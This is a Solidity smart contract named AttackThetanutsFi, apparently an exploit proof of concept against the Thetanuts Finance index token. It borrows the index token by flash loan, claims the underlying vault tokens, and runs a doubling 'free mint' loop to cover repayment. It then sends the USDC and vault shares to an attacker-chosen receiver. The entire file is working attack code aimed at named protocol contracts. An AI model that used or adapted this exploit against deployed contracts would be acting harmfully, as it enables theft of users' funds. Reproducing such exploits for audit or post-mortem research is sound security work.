// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ThetanutsConstants as C} from "../../src/ThetanutsFi/Constants.sol";
import {IIndexToken} from "../../src/ThetanutsFi/interfaces/IIndexToken.sol";
import {IVaultToken} from "../../src/ThetanutsFi/interfaces/IVaultToken.sol";
import {ILendingRouter} from "../../src/ThetanutsFi/interfaces/ILendingRouter.sol";
import {IFlashLoanReceiver} from "../../src/ThetanutsFi/interfaces/IFlashLoanReceiver.sol";

contract AttackThetanutsFi is IFlashLoanReceiver {
    using SafeERC20 for IERC20;

    error OnlyRouter();
    error MintLoopFailed();
    error UnexpectedFlashAsset();

    address private immutable router;
    uint256 private immutable targetRemainingSupply;
    address private receiver;

    constructor(uint256 _targetRemainingSupply) {
        router = C.LENDING_ROUTER;
        targetRemainingSupply = _targetRemainingSupply;
    }

    function attack(address profitReceiver) external {
        receiver = profitReceiver;

        uint256 borrowAmount = _borrowAmount();

        address[] memory assets = new address[](1);
        assets[0] = C.INDEX_TOKEN;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = borrowAmount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        ILendingRouter(router).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            "",
            0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external override returns (bool) {
        if (msg.sender != router) revert OnlyRouter();
        if (assets.length != 1 || assets[0] != C.INDEX_TOKEN) {
            revert UnexpectedFlashAsset();
        }

        uint256 borrowAmount = amounts[0];
        uint256 premium = premiums[0];
        uint256 repayTarget = borrowAmount + premium;

        IIndexToken index = IIndexToken(C.INDEX_TOKEN);

        index.claim(borrowAmount);
        _approveVaultTokensForMint();
        _freeMintLoop(repayTarget);

        IERC20 indexErc20 = IERC20(C.INDEX_TOKEN);
        indexErc20.safeApprove(router, repayTarget);

        _withdrawVault(C.VAULT_BTCUSD);
        _withdrawVault(C.VAULT_ETHUSD);

        uint256 usdcBalance = IERC20(C.USDC).balanceOf(address(this));
        if (usdcBalance > 0) {
            IERC20(C.USDC).transfer(receiver, usdcBalance);
        }

        _transferVaultShares(C.VAULT_AVAXUSD);
        _transferVaultShares(C.VAULT_BNBUSD);
        _transferVaultShares(C.VAULT_MATICUSD);

        return true;
    }

    function _borrowAmount() internal view returns (uint256) {
        return IIndexToken(C.INDEX_TOKEN).totalSupply() - targetRemainingSupply;
    }

    function _approveVaultTokensForMint() internal {
        address[5] memory vaults = [
            C.VAULT_BTCUSD,
            C.VAULT_ETHUSD,
            C.VAULT_AVAXUSD,
            C.VAULT_BNBUSD,
            C.VAULT_MATICUSD
        ];
        for (uint256 i; i < vaults.length; i++) {
            IERC20(vaults[i]).safeApprove(C.INDEX_TOKEN, type(uint256).max);
        }
    }

    function _freeMintLoop(uint256 repayTarget) internal {
        IIndexToken index = IIndexToken(C.INDEX_TOKEN);
        IERC20 indexErc20 = IERC20(C.INDEX_TOKEN);

        uint256 amount = 2;

        for (uint256 i; i < C.MAX_MINT_ITERATIONS; ++i) {
            uint256 balance = indexErc20.balanceOf(address(this));
            if (balance >= repayTarget) {
                return;
            }

            uint256 remaining = repayTarget - balance;
            if (amount > remaining) {
                amount = remaining;
            }

            try index.mint(amount) {
                amount *= 2;
            } catch {
                if (amount <= 2) revert MintLoopFailed();
                amount = 2;
            }
        }

        revert MintLoopFailed();
    }

    function _withdrawVault(address vaultToken) internal {
        uint256 shares = IVaultToken(vaultToken).balanceOf(address(this));
        if (shares == 0) return;
        IVaultToken(vaultToken).initWithdraw(shares);
    }

    function _transferVaultShares(address vaultToken) internal {
        uint256 shares = IVaultToken(vaultToken).balanceOf(address(this));
        if (shares == 0) return;
        IVaultToken(vaultToken).transfer(receiver, shares);
    }
}
